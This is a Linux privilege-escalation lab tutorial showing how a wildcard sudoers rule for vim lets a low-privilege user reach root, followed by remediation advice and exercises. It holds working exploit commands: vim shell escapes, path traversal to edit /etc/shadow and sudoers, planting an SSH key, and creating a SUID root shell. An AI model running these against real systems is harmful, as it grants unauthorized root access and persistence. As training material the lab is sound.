# LAB: Sudo Wildcard Bypass → Root

**Real-World Privilege Escalation**

---

## Scenario: Delegated Developer Access

You are a penetration tester who has gained initial access to a Linux server as a low-privilege user (`developer`). Your goal is to escalate to root.

**Background:**
The sysadmin has granted developers limited sudo access to edit configuration files in a specific directory. The sudoers entry uses a wildcard pattern to allow flexibility.

**Your access:**
- SSH access as `developer`
- Sudo access to edit files in `/var/www/html/*` using vim
- No full root access

**Your mission:**
Escalate from `developer` with limited sudo to full `root` access.

---

## Learning Objectives

By the end of this lab, you will be able to:

1. Understand how sudo wildcards can be abused
2. Identify dangerous sudoers configurations
3. Exploit path traversal in sudo wildcards
4. Escape from editors to gain shell access
5. Recognize the importance of precise sudo rules

---

## PHASE 0 — Environment Setup (Instructor Only)

### Create the developer user

```bash
useradd -m -s /bin/bash developer
echo "developer:developer123" | chpasswd
```

### Create the web directory

```bash
mkdir -p /var/www/html
echo "<html><body>Hello World</body></html>" > /var/www/html/index.html
chown -R developer:developer /var/www/html
chmod 755 /var/www/html
```

### Create the vulnerable sudoers entry

```bash
cat >> /etc/sudoers.d/developer << 'EOF'
# Allow developer to edit web files
developer ALL=(root) NOPASSWD: /usr/bin/vim /var/www/html/*
EOF
chmod 440 /etc/sudoers.d/developer
```

**Setup complete.** The environment mimics a common delegated administration pattern.

---

## PHASE 1 — Initial Access & Reconnaissance

### Log in as the attacker

```bash
su - developer
```

### Check sudo privileges

```bash
sudo -l
```

**Expected output:**
```
User developer may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/vim /var/www/html/*
```

### Verify limited access

```bash
# This should work (within allowed path)
sudo /usr/bin/vim /var/www/html/index.html

# This should fail (outside allowed path)
sudo /usr/bin/vim /etc/passwd
```

---

## PHASE 2 — Understanding the Vulnerability

### How sudo wildcards work

The `*` in sudo rules matches any characters but does **not** prevent path traversal.

**Rule:** `/usr/bin/vim /var/www/html/*`

**Intended use:**
```bash
sudo vim /var/www/html/index.html    ✓ Allowed
sudo vim /var/www/html/config.php    ✓ Allowed
```

**Abuse via path traversal:**
```bash
sudo vim /var/www/html/../../../etc/shadow    ✓ ALSO ALLOWED!
```

The path `/var/www/html/../../../etc/shadow` matches the pattern because:
1. It starts with `/var/www/html/`
2. `*` matches `../../../etc/shadow`

### Additional attack vectors

1. **Path traversal:** Edit files outside the allowed directory
2. **Vim shell escape:** Use vim's `:!bash` to get a root shell
3. **Vim file write:** Use vim to write to any file

---

## 🔴 STOP AND THINK

**Ask yourself:**

1. Does the wildcard prevent path traversal? → **No**
2. Can vim execute shell commands? → **Yes** (`:!command`)
3. Does this vim run as root? → **Yes** (via sudo)

**This is a sudo wildcard bypass vulnerability.**

---

## PHASE 3 — Exploitation

### Method 1: Vim Shell Escape (Easiest)

The simplest approach — vim can spawn a shell:

```bash
sudo /usr/bin/vim /var/www/html/index.html
```

Once in vim, type:
```
:!/bin/bash
```

Or:
```
:shell
```

You now have a root shell!

### Verify root access

```bash
id
whoami
```

### Method 2: Path Traversal to Edit Sensitive Files

Edit the shadow file directly:

```bash
sudo /usr/bin/vim /var/www/html/../../../etc/shadow
```

Or edit sudoers:

```bash
sudo /usr/bin/vim /var/www/html/../../../etc/sudoers
```

Add yourself as a full sudo user:
```
developer ALL=(ALL) NOPASSWD: ALL
```

### Method 3: Add SSH Key

```bash
sudo /usr/bin/vim /var/www/html/../../../root/.ssh/authorized_keys
```

Add your SSH public key to gain persistent root access.

### Method 4: Create SUID Shell via Vim

In vim as root:
```
:!/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
```

Exit vim and run:
```bash
/tmp/rootbash -p
```

---

## PHASE 4 — Verification

### After any method, verify root access

```bash
id
```

**Expected:**
```
uid=0(root) gid=0(root) groups=0(root)
```

Or with SUID shell:
```
uid=1001(developer) gid=1001(developer) euid=0(root)
```

### Demonstrate root capabilities

```bash
cat /etc/shadow | head -3
touch /root/pwned_by_developer
```

---

## PHASE 5 — Post-Exploitation Analysis

### The attack chain

```
developer (limited sudo)
    │
    ├── Examined sudo -l output
    ├── Found wildcard pattern in vim rule
    │
    ▼
Method 1: Vim shell escape
    │
    ├── sudo vim /var/www/html/index.html
    ├── :!/bin/bash
    │
    ▼
root (uid=0)

OR

Method 2: Path traversal
    │
    ├── sudo vim /var/www/html/../../../etc/sudoers
    ├── Added: developer ALL=(ALL) NOPASSWD: ALL
    │
    ▼
developer (full sudo) → root
```

### What failed

| Layer | Failure |
|-------|---------|
| **Sudoers** | Wildcard allows path traversal |
| **Editor** | vim can execute arbitrary commands |
| **Design** | No restriction on vim's capabilities |

### The one-sentence summary

> **Sudo wildcards don't prevent path traversal, and vim can execute shell commands.**

---

## REMEDIATION

### Fix 1: Use specific file paths, not wildcards

```bash
# Bad
developer ALL=(root) NOPASSWD: /usr/bin/vim /var/www/html/*

# Good
developer ALL=(root) NOPASSWD: /usr/bin/vim /var/www/html/index.html
developer ALL=(root) NOPASSWD: /usr/bin/vim /var/www/html/config.php
```

### Fix 2: Use sudoedit instead of vim

```bash
# sudoedit copies the file, edits as the user, then copies back
developer ALL=(root) NOPASSWD: sudoedit /var/www/html/*
```

`sudoedit` is safer because:
- The editor runs as the user, not root
- No shell escapes possible
- File is copied, not edited directly

### Fix 3: Use rvim (restricted vim)

```bash
# rvim disables shell escapes
developer ALL=(root) NOPASSWD: /usr/bin/rvim /var/www/html/*
```

`rvim` disables:
- `:!` shell commands
- `:shell`
- Suspend with Ctrl-Z

### Fix 4: Use NOEXEC

```bash
# NOEXEC prevents executed programs from running further programs
developer ALL=(root) NOPASSWD: NOEXEC: /usr/bin/vim /var/www/html/*
```

### Fix 5: Don't use wildcards at all

Best practice: Be explicit about what commands are allowed.

```bash
# Most restrictive approach
developer ALL=(root) NOPASSWD: sudoedit /var/www/html/index.html
developer ALL=(root) NOPASSWD: sudoedit /var/www/html/.htaccess
```

---

## VULNERABILITY CLASSIFICATION

| Framework | Classification |
|-----------|----------------|
| **CWE** | CWE-269: Improper Privilege Management |
| **CWE** | CWE-22: Path Traversal |
| **MITRE ATT&CK** | T1548.003: Sudo and Sudo Caching |
| **GTFOBins** | https://gtfobins.github.io/gtfobins/vim/#sudo |

---

## OTHER DANGEROUS SUDO PATTERNS

### Commands with shell escape potential

```bash
# All of these can spawn a shell when run via sudo:
less, more, man, vim, vi, nano, emacs, ftp, gdb, awk, find,
nmap, perl, python, ruby, lua, php, tar, zip, journalctl,
mysql, psql, git, env, LD_PRELOAD, and many more...
```

Reference: [GTFOBins](https://gtfobins.github.io)

### Other dangerous wildcard patterns

```bash
# Path traversal possible:
/usr/bin/cat /var/log/*
/usr/bin/chmod 755 /var/www/*

# Command injection possible:
/usr/bin/find /var/www -name *
```

---

## REAL-WORLD EXAMPLES

This vulnerability pattern appears in:

1. **Web hosting environments** — Developers given limited file access
2. **Shared servers** — Users given access to edit their home directories
3. **Application maintenance** — Operators given access to edit configs

---

## CLEANUP (Instructor)

```bash
pkill -u developer 2>/dev/null || true
userdel -r developer 2>/dev/null || true
rm -f /etc/sudoers.d/developer
rm -rf /var/www/html
rm -f /tmp/rootbash
rm -f /root/pwned_by_developer
```

---

## STUDENT EXERCISES

### Exercise 1: Other Editors

Research shell escapes in:
- nano
- emacs
- less
- more

### Exercise 2: GTFOBins

Visit https://gtfobins.github.io and find 10 commands that can be abused with sudo.

### Exercise 3: Write Secure Sudoers

Write a secure sudoers entry that allows a user to restart nginx without enabling privilege escalation.

### Exercise 4: Audit Existing Sudoers

Write a script that scans sudoers for:
- Wildcard patterns
- Commands on GTFOBins list
- Missing NOEXEC tags
